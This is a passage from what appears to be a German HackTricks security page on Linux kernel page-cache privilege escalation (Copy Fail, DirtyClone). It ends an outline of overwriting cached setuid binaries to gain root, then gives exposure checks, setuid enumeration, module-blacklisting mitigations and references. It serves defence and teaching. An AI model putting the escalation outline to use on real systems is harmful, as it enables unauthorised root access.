6. Wiederholen, bis die Page-Cache-Kopie von `/usr/bin/su` oder einer anderen privilegierten ausführbaren Datei attacker-kontrollierten Code enthält

In der Praxis entspricht die Auswirkung dem `AF_ALG`-Beispiel: Die Datei auf der Festplatte bleibt sauber, aber `execve()` verwendet die **veränderten Page-Cache-Bytes** und verschafft root.<sup>[[8]](#references)[[9]](#references)</sup>

Nützliche Prüfungen auf eine Gefährdung durch diese Variante:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Eine kurzfristige Reduzierung der Angriffsfläche ist auch hier pfadspezifisch: Ein Upgrade auf einen Kernel mit `48f6a5356a33` behebt den Clone-Pfad, während das Blockieren des Autoloads von `xt_TEE` den **Flag-Laundering-Schritt** entfernt und das Blockieren von `esp4` / `esp6` den **Entschlüsselungs-Sink** entfernt.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Angriffsfläche und Threat Hunting

Wenn Sie diese Fehlerklasse vermuten, verlassen Sie sich nicht nur auf Integritätsprüfungen der Festplatte. Prüfen Sie außerdem:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Die folgenden Konfigurationswerte unterscheiden eine ladbare Schnittstelle von einer in den Kernel integrierten; die Crypto-Build-Regeln ordnen `CONFIG_CRYPTO_USER_API_AEAD` `algif_aead` zu.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kann als Modul geladen und entladen werden
- `CONFIG_CRYPTO_USER_API_AEAD=y`: Die Schnittstelle ist in den Kernel integriert
- setuid-Binaries sind gute Ziele, da ein Patch, der nur den Page Cache betrifft, ausreichen kann, um einen lokalen Zugang zu root-Rechten auszuweiten

#### Angriffsflächenreduzierung für den `algif_aead`-Pfad

Wenn die anfällige Schnittstelle von einem ladbaren Modul bereitgestellt wird:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Wenn es in den Kernel einkompiliert ist, wurde in einigen Berichten angegeben, dass der Init-Pfad mit Folgendem blockiert wird:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Diese Art von Mitigation sollte man auch bei anderen Kernel-LPEs im Hinterkopf behalten: Wenn ein Exploit von einer bestimmten optionalen Schnittstelle abhängt, kann das Deaktivieren oder Blacklisting dieser Schnittstelle den Exploit-Pfad unterbrechen, noch bevor ein vollständiges Kernel-Upgrade verfügbar ist.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – Übernahme eines als root ausgeführten Skripts in einem benutzerschreibbaren PaperCut-Verzeichnis](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) – FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security-Veröffentlichung zu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux-Stable-Fix: crypto: algif_aead – Zurück zur Out-of-Place-Verarbeitung](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail – CVE-2026-31431-Advisory](https://copy.fail/)
- [7] [Technischer Bericht von Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone-Repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Analyse und Ausnutzung der Linux-LPE-Variante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux-Fix: net: skb: `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` beibehalten (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Frühere Linux-Mitigation: `SKBFL_SHARED_FRAG` für gesplicte UDP-Pakete setzen (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git-Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) – Debian-Handbuchseite](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc – Linux-Kernel-Dokumentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Zuordnungen von MIME-Anwendungen](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Spezifikation für Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Spezifikation für Desktop-Einträge](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig-Sprache](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux-Crypto-Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: AF_ALG-Page-Cache-Schwachstelle im Linux-Kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf – HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git-Dokumentation zu `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Git-Dokumentation zu `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Git-Konfigurationsdokumentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` – Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Dokumentation zu systemd-Generatoren](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs – Linux Detection Engineering: Persistenzmechanismen](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf – HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
